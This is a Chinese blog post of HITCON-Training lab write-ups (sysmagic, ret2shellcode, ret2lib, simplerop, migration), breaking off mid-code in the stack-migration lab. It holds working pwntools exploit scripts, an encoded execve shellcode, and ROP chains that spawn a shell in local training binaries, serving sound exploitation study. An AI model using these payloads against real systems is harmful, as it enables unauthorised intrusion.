{"title":"HITCON_training题解(一)","slug":"HITCON-training-1","date":"2019-04-10T06:47:42.000Z","updated":"2019-04-10T06:58:02.000Z","comments":true,"path":"api/articles/HITCON-training-1.json","photos":[],"link":"","excerpt":null,"covers":null,"content":"<h2 id=\"Lab1——sysmagic\"><a href=\"#Lab1——sysmagic\" class=\"headerlink\" title=\"Lab1——sysmagic\"></a>Lab1——sysmagic</h2><h3 id=\"防护\"><a href=\"#防护\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab1$ checksec sysmagic</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab1/sysmagic&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>程序要求输入一个magic，然后就直接退出。用IDA看一下：</p>\n<p>在函数get_flag中直接要求读入到栈上v2处（ebp+0x7c），如果v2和随机数buf相等，则直接打印出栈上的flag。buf在(ebp+0x80处)。不过貌似没有较好的溢出方法，不过这实际上是一道逆向题，通过逆向可以直接找到答案。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fd = open(<span class=\"string\">\"/dev/urandom\"</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"> read(fd, &amp;buf, <span class=\"number\">4u</span>);</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\"Give me maigc :\"</span>);</span><br><span class=\"line\"> __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v2);</span><br><span class=\"line\"> <span class=\"keyword\">if</span> ( buf == v2 )</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">0x30</span>; ++i )</span><br><span class=\"line\">     <span class=\"built_in\">putchar</span>((<span class=\"keyword\">char</span>)(*(&amp;v5 + i) ^ *((_BYTE *)&amp;v54 + i)));</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>观察汇编代码，还原两个字符串，然后按位异或即可找到flag。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">str1 = &apos;\\x44\\x6f\\x5f\\x79\\x6f\\x75\\x5f\\x6b&apos;</span><br><span class=\"line\">str1 += &apos;\\x6e\\x6f\\x77\\x5f\\x77\\x68\\x79\\x5f&apos;</span><br><span class=\"line\">str1 += &apos;\\x6d\\x79\\x5f\\x74\\x65\\x61\\x6d\\x6d&apos;</span><br><span class=\"line\">str1 += &apos;\\x61\\x74\\x65\\x5f\\x4f\\x72\\x61\\x6e&apos;</span><br><span class=\"line\">str1 += &apos;\\x67\\x65\\x5f\\x69\\x73\\x5f\\x73\\x6f&apos;</span><br><span class=\"line\">str1 += &apos;\\x5f\\x61\\x6e\\x67\\x72\\x79\\x3f\\x3f\\x3f&apos;</span><br><span class=\"line\">str2 = &apos;\\x07\\x3b\\x19\\x02\\x0b\\x10\\x3d\\x1e&apos;</span><br><span class=\"line\">str2 += &apos;\\x09\\x08\\x12\\x2d\\x28\\x59\\x0a\\x00\\x1e&apos;</span><br><span class=\"line\">str2 += &apos;\\x16\\x00\\x04\\x55\\x16\\x08\\x1f\\x07\\x01&apos;</span><br><span class=\"line\">str2 += &apos;\\x09\\x00\\x7e\\x1c\\x3e\\x0a\\x1e\\x0b\\x6b&apos;</span><br><span class=\"line\">str2 += &apos;\\x04\\x42\\x3c\\x2c\\x5b\\x31\\x55\\x02\\x1e&apos;</span><br><span class=\"line\">str2 += &apos;\\x21\\x10\\x4c\\x1e\\x42&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">flag = &quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(len(str1)):</span><br><span class=\"line\">\tflag += chr(ord(str1[i]) ^ ord(str2[i]))</span><br><span class=\"line\"></span><br><span class=\"line\">print flag</span><br><span class=\"line\"></span><br><span class=\"line\">CTF&#123;debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!&#125;</span><br><span class=\"line\">[Finished in 0.1s]</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab2——orw\"><a href=\"#Lab2——orw\" class=\"headerlink\" title=\"Lab2——orw\"></a>Lab2——orw</h2><p>是手写汇编的练习，略。</p>\n<h2 id=\"Lab3——ret2shellcode\"><a href=\"#Lab3——ret2shellcode\" class=\"headerlink\" title=\"Lab3——ret2shellcode\"></a>Lab3——ret2shellcode</h2><h3 id=\"防护-1\"><a href=\"#防护-1\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>未开启任何防护</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab3$ checksec ret2sc</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab3/ret2sc&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX disabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br><span class=\"line\">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-1\"><a href=\"#分析-1\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>顾名思义，该题是用ret2sc的方法。main函数中首先从stdin读入，往bss段上写了0x32字节，然后栈溢出返回到刚刚写的地址即可。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> s; <span class=\"comment\">// [esp+1Ch] [ebp-14h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Name:\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;name, <span class=\"number\">0x32</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Try your best:\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"keyword\">int</span>)gets(&amp;s);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./ret2sc\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./ret2sc\"</span>)</span><br><span class=\"line\"><span class=\"comment\"># ref: https://www.exploit-db.com/shellcodes/41630</span></span><br><span class=\"line\">shellcode = <span class=\"string\">\"\\xeb\\x10\\x5e\\x31\\xc9\\xb1\\x15\\x8a\\x06\\x34\\xe9\\x88\\x06\\x46\\xe2\\xf7\\xeb\\x05\\xe8\\xeb\\xff\\xff\\xff\\xd8\\x20\\xb8\\x81\\xc6\\xc6\\x9a\\x81\\x81\\xc6\\x8b\\x80\\x87\\x60\\x0a\\x83\\xe2\\xb1\\x70\\x24\\x69\"</span></span><br><span class=\"line\">bss_addr = <span class=\"number\">0x804a060</span></span><br><span class=\"line\">offset = <span class=\"number\">0x1c</span> + <span class=\"number\">4</span></span><br><span class=\"line\">p.sendafter(<span class=\"string\">\"Name:\"</span>, shellcode)</span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></span><br><span class=\"line\">p.sendafter(<span class=\"string\">\"Try your best:\"</span>, offset *<span class=\"string\">\"a\"</span> + p32(bss_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab4——ret2lib\"><a href=\"#Lab4——ret2lib\" class=\"headerlink\" title=\"Lab4——ret2lib\"></a>Lab4——ret2lib</h2><h3 id=\"防护-2\"><a href=\"#防护-2\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>开启了NX，无法使用ret2sc。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab4$ checksec ret2lib</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab4/ret2lib&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-2\"><a href=\"#分析-2\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>程序首先会主动leak出任意地址，可以通过这一点leak got表获取libc的加载基址，然后构造rop链即可。</p>\n<p>注意在Print_message中dest离eip的偏移为0x38 + 4</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> **v3; <span class=\"comment\">// ST04_4</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v4; <span class=\"comment\">// ST08_4</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> src; <span class=\"comment\">// [esp+12h] [ebp-10Eh]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [esp+112h] [ebp-Eh]</span></span><br><span class=\"line\">  _DWORD *v8; <span class=\"comment\">// [esp+11Ch] [ebp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"###############################\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Do you know return to library ?\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"###############################\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"What do you want to see in memory?\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Give me an address (in dec) :\"</span>);</span><br><span class=\"line\">  fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">0xA</span>u);</span><br><span class=\"line\">  v8 = (_DWORD *)strtol(&amp;buf, v3, v4);</span><br><span class=\"line\">  See_something(v8);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Leave some message for me :\"</span>);</span><br><span class=\"line\">  fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;src, <span class=\"number\">0x100</span>u);</span><br><span class=\"line\">  Print_message(&amp;src);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Thanks you ~\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./ret2lib\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./ret2lib\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">p.send(str(elf.got[<span class=\"string\">'__libc_start_main'</span>]))</span><br><span class=\"line\">addr = int(p.recvline().split(<span class=\"string\">\": \"</span>)[<span class=\"number\">-1</span>].strip(), <span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc.address = addr - libc.symbols[<span class=\"string\">'__libc_start_main'</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\">write = libc.symbols[<span class=\"string\">'write'</span>]</span><br><span class=\"line\">binsh = next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">main_addr = <span class=\"number\">0x8048570</span></span><br><span class=\"line\"></span><br><span class=\"line\">offset = <span class=\"number\">0x38</span> + <span class=\"number\">4</span></span><br><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(system)</span><br><span class=\"line\">rop += p32(main_addr)</span><br><span class=\"line\">rop += p32(binsh)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendafter(<span class=\"string\">\"for me :\"</span>, rop)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab5——simplerop\"><a href=\"#Lab5——simplerop\" class=\"headerlink\" title=\"Lab5——simplerop\"></a>Lab5——simplerop</h2><h3 id=\"防护-3\"><a href=\"#防护-3\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab5$ checksec simplerop</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab5/simplerop&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-3\"><a href=\"#分析-3\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>直接栈溢出。不过该题是静态链接的，没有加载libc.so，并且题目中没有system，所以需要手动构造ROP链，利用系统调用sys_execve执行利用。</p>\n<p>首先要把参数写到相应的寄存器，然后执行int 0x80</p>\n<ul>\n<li>系统调用号存入EAX（execve的为11）</li>\n<li>通过ebx,ecx,edx,esi,edi等传递参数</li>\n<li>最后调用int 0x80</li>\n</ul>\n<p>这里要用到ROPgadget工具，来搜索可用的gadget。主要就是一些pop|ret和int 0x80的gadget。</p>\n<p>另外，题目中没有现成的/bin/sh字符串，需要首先写入。我采用的是调用静态链接进来的read函数，写入到bss段。官方writeup中采用了一种更为巧妙的方法，使用如下的gadget</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov dword ptr [edx], eax ;</span><br><span class=\"line\">ret ;</span><br></pre></td></tr></table></figure>\n<p>通过<code>pop eax;ret pop edx; ret</code>将字符串四位四位的写到data段（或bss段）。可以看到这种方法的通用性更强。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#write to memory</span></span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span>*<span class=\"number\">32</span></span><br><span class=\"line\">payload += p32(pop_edx_ret)</span><br><span class=\"line\">payload += p32(buf)</span><br><span class=\"line\">payload += p32(pop_eax_ret)</span><br><span class=\"line\">payload += <span class=\"string\">\"/bin\"</span></span><br><span class=\"line\">payload += p32(gadget)</span><br><span class=\"line\">payload += p32(pop_edx_ret)</span><br><span class=\"line\">payload += p32(buf+<span class=\"number\">4</span>)</span><br><span class=\"line\">payload += p32(pop_eax_ret)</span><br><span class=\"line\">payload += <span class=\"string\">\"/sh\\x00\"</span></span><br><span class=\"line\">payload += p32(gadget)</span><br></pre></td></tr></table></figure>\n<p>我的exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./simplerop\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./simplerop\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">int80 = <span class=\"number\">0x080493e1</span></span><br><span class=\"line\">popecx_popebx = <span class=\"number\">0x0806e851</span></span><br><span class=\"line\">popeax = <span class=\"number\">0x080bae06</span></span><br><span class=\"line\">popedx = <span class=\"number\">0x0806e82a</span></span><br><span class=\"line\">bss_addr = <span class=\"number\">0x80ec2c0</span></span><br><span class=\"line\">main_addr = <span class=\"number\">0x8048e24</span></span><br><span class=\"line\">read = <span class=\"number\">0x806cd50</span></span><br><span class=\"line\">offset = <span class=\"number\">0x20</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(read)</span><br><span class=\"line\">rop += p32(main_addr)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>)</span><br><span class=\"line\">rop += p32(bss_addr)</span><br><span class=\"line\">rop += p32(<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(rop)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">\"/bin/sh\\x00\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">rop = (offset - <span class=\"number\">8</span>) * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(popeax)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0xb</span>)</span><br><span class=\"line\">rop += p32(popecx_popebx)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>) + p32(bss_addr)</span><br><span class=\"line\">rop += p32(popedx)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>)</span><br><span class=\"line\">rop += p32(int80)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(rop)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab6——migration\"><a href=\"#Lab6——migration\" class=\"headerlink\" title=\"Lab6——migration\"></a>Lab6——migration</h2><h3 id=\"防护-4\"><a href=\"#防护-4\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab6$ checksec migration</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab6/migration&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-4\"><a href=\"#分析-4\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>该题溢出的字节较少，而又需要leak libc，构造利用链，所以显然栈空间是不够的；但是又不能先布置shellcode，再<code>jmp esp</code>跳到shellcode执行，所以需要考虑其他方法。根据题目名字的提示，应该是用栈迁移的方法。</p>\n<p>用ROPgadget搜索，注意到以下gadget</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x08048418 : leave ; ret</span><br></pre></td></tr></table></figure>\n<p>我们通过溢出将栈布局为如下格式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">buffer padding | fake ebp | leave ret addr|</span><br></pre></td></tr></table></figure>\n<ul>\n<li>函数的返回地址被覆盖为leave_ret的地址，这样在函数执行完自己的leave_ret后还会在执行一次leave_ret。当函数执行完自己的leave时，ebp为fake ebp的值，即指向ebp2；当函数再执行自己的ret的时候，会执行leave_ret，先令esp也指向ebp2，然后将fake ebp处的第一个4bytes pop给ebp，即将ebp的值修改为ebp2，然后执行ret，将fake ebp后的第二个4bytes所存的地址给eip，即将eip的值修改为target function addr。</li>\n<li>如果调用的是函数，则函数入口点首先会调用push ebp，就会将ebp2的值压栈；然后调用mov ebp，esp，ebp指向当前基地址。</li>\n<li>由上可知，我们fake ebp处假的栈桢结构如下：</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fake ebp</span><br><span class=\"line\"></span><br><span class=\"line\">ebp2 | target function addr | leave ret addr | arg1 | arg2</span><br></pre></td></tr></table></figure>\n<ul>\n<li>当程序在执行完target function之后，会再执行两次leave_ret，如果我们在ebp2处也布置好了对应的内容，就可以一直控制程序的执行流程</li>\n</ul>\n<p>我们需要一块可以写的内存，并且我们还知道这块内存的地址。所以通过gdb调试可以看出，由于未开启PIE，elf文件所加载的地址我们是知道的，而这其中可读可写的段有0x804a000~0x804b000，在这0x1000个bytes中找一块内存区域即可。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span 